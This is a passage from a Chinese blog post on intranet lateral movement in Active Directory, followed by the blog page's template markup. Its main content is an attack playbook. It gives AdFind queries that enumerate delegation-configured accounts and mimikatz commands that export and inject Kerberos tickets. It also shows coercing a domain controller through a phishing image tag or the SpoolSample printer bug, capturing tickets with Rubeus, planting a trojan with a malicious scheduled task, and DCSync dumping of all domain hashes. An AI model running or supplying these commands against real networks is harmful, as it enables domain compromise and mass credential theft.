+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">AdFind.exe -f &quot;(&amp;(objectcategory=person)(objectclass=user)(servicePrincipalName=*)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; sAMAccountName servicePrincipalName<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><font style="color:rgba(0, 0, 0, 0.75);">查找所有非约束性委派的对象（用户+机器</font><font style="color:rgb(64, 64, 64);">）</font></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">AdFind.exe -f &quot;(&amp;(|(objectcategory=person)(objectcategory=computer))(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;<br></code></pre></td></tr></table></figure>
+
+<h5 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h5><p>信任此计算机来委派任何服务</p>
+<p>setspn -U -A priv&#x2F;test webadmin</p>
+<ul>
+<li>思路1</li>
+</ul>
+<p>1.查询域内哪些账户设置了非约束委派</p>
+<p>2.诱导（主动或被动）域控访问非约束委派的机器IP</p>
+<p>在域控上手动命令方式访问受害主机 net use &#x2F;&#x2F;10.10.10.131&#x2F;c$</p>
+<p>钓鱼方式：网页访问&lt;img src&#x3D;”file:&#x2F;&#x2F;&#x2F;\10.10.10.131\c$” </p>
+<p>3.导出票据：mimikatz sekurlsa::tickets &#x2F;export</p>
+<p>4.重新导入到内存：mimikatz kerberos::ptt xxx.kirbi </p>
+<p>5.连接域控通信：dir \x.x.x.x\c$、copy木马到域控</p>
+<p>6.schtasks 远程创建恶意定时任务</p>
+<ul>
+<li>思路2（结合打印机漏洞）</li>
+</ul>
+<p>利用条件：DC为2012以上、administrator权限监听、打印机服务spooler开启（默认开启）</p>
+<p>监听来自DC的请求：Rubeus.exe monitor &#x2F;interval:2 &#x2F;filteruser:dc$ &gt; hash.txt</p>
+<p>域用户运行SpoolSample.exe强制让DC请求：Spoolsample.exe dc 域成员机器名</p>
+<p>Rubeus监听到票据并导入票据到内存中：Rubeus.exe ptt &#x2F;ticket:xxx(hash文件中的base64编码的数据)</p>
+<p>使用mimikatz导出域内所有用户hash：mimikatz lsadump:dcsync &#x2F;domain:域名 &#x2F;all &#x2F;csv command</p>
+<h4 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a><font style="color:rgb(79, 79, 79);">约束性委派</font></h4><ul>
+<li><font style="color:rgba(0, 0, 0, 0.75);">查询域中配置了约束性委派的机器账户</font></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">AdFind.exe -f &quot;(&amp;(objectcategory=computer)(msDS-AllowedToDelegateTo=*))&quot; msDS-AllowedToDelegateTo<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><font style="color:rgba(0, 0, 0, 0.75);">查询询域中配置了约束性委派的用户账户</font></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">AdFind.exe -f &quot;(&amp;(objectcategory=person)(objectclass=user)(msDS-AllowedToDelegateTo=*))&quot; msDS-AllowedToDelegateTo<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><font style="color:rgba(0, 0, 0, 0.75);">查询询域中配置了约束性委派的服务账户</font></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">AdFind.exe -f &quot;(&amp;(objectcategory=person)(objectclass=user)(servicePrincipalName=*)(msDS-AllowedToDelegateTo=*))&quot; sAMAccountName servicePrincipalName msDS-AllowedToDelegateTo<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><font style="color:rgb(64, 64, 64);">查找所有约束性委派的对象（用户+机器）</font></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">AdFind.exe -f &quot;(&amp;(|(objectcategory=person)(objectcategory=computer))(msDS-AllowedToDelegateTo=*))&quot; msDS-AllowedToDelegateTo<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="基于资源的非约束性委派"><a href="#基于资源的非约束性委派" class="headerlink" title="基于资源的非约束性委派"></a><font style="color:rgb(79, 79, 79);">基于资源的非约束性委派</font></h4><ul>
+<li><font style="color:rgba(0, 0, 0, 0.75);">查询域中配置基于资源的约束性委派主机</font></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">AdFind.exe -b &quot;DC=tmac,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msDS-Allo wedToActOnBehalfOfOtherIdentity=*))&quot; msDS-AllowedToActOnBehalfOfOtherIdentit y<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><font style="color:rgba(0, 0, 0, 0.75);">查询域中配置基于资源的约束性委派的服务账户</font></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">AdFind.exe -b &quot;DC=tmac,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msDS-Allo wedToActOnBehalfOfOtherIdentity=*))&quot; msDS-AllowedToActOnBehalfOfOtherIdentit y<br></code></pre></td></tr></table></figure>
+
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="category-chain-item">内网安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="print-no-link">#内网安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>横向移动</div>
+      <div>https://ytcenter.github.io/2024/06/05/内网安全/横向移动/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>admin</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年6月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/06/10/git-used/" title="git使用教程">
+                        <span class="hidden-mobile">git使用教程</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
